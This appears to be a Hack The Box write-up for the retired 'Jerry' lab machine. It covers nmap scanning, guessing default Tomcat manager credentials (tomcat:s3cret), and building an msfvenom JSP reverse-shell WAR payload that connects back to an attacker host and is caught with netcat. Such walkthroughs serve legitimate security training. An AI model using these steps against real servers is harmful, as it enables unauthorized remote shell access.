#### Jerry has retired and this is my write-up about it...
<br>
#### Jerry was one of the easiest boxes on HTB. It was a beginner-box . 
#### It's a windows box and its ip is 10.10.10.95

<hr>
<br>
#### Starting with nmap to scan for tcp ports and services :
`nmap -sV -sT 10.10.10.95`

<hr>
<br>
#### We can see that the port 8080 is open and running http and the server is Apache Tomcat.
#### By visiting it in the browser we get the default tomcat configuration page.

<br>
#### There's a manager app so let's try to access it .

<hr>
<br>
#### It asks for authentication and common passwords like those mentioned below didn't work:
*tomcat:tomcat* <br>
*admin:admin* <br>
*admin:password* <br>
*user:password* <br>
#### So by closing the login panel it causes an error because we are not authorized to view the manager page
#### But by looking at the error page :

<hr>
<br>
#### It shows these credentials :
*tomcat:s3cret*
#### This seems to be a part of the documentation and those credentials are dafault credentials.
#### Will they work ? yup !

## Exploitation
#### Now we are logged in to the manager app and we can get a shell from here
<br>
#### We are on an apache tomcat server and apache tomcat uses WAR files.
#### To get a reverse shell we will use msfvenom to create the payload :
<br>
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.xx.xx LPORT=4449 -f war > backdoor.war`
![](/images/hackthebox/jerry/7.jpg)
<br>
#### Then we will upload our payload to the server.

<br>
#### Then we will listen to the port with netcat :
<br>
`nc -lvnp 4449`
<hr>
<br>
#### Now we got a reverse shell as admin so there's no need for previlege escalation.

#### Another way to do this is to use this tool written by **mgeeky** [TomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) to automate the process of getting a shell
